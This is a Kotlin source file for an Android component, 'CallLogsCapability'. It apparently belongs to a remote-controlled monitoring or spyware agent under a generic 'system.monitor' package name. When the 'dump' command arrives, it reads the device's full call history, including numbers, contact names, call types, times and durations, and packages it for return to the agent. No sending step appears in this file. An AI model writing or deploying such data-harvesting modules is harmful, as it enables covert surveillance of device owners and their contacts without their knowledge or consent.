package com.system.monitor.capabilities

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import com.google.gson.Gson
import com.system.monitor.AgentService

class CallLogsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "dump" -> dumpCallLogs()
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun dumpCallLogs(): Map<String, Any> {
        val calls = mutableListOf<Map<String, Any>>()
        val resolver: ContentResolver = service.contentResolver
        val cursor = resolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME),
            null, null, "${CallLog.Calls.DATE} DESC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndexOrThrow(CallLog.Calls._ID))
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                calls.add(mapOf(
                    "id" to id,
                    "number" to number,
                    "name" to name,
                    "type" to when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                        CallLog.Calls.REJECTED_TYPE -> "rejected"
                        CallLog.Calls.BLOCKED_TYPE -> "blocked"
                        CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "answered_externally"
                        else -> "unknown"
                    },
                    "date" to date,
                    "duration" to duration
                ))
            }
        }
        return mapOf("calls" to calls, "count" to calls.size)
    }

    data class Params(val action: String)
}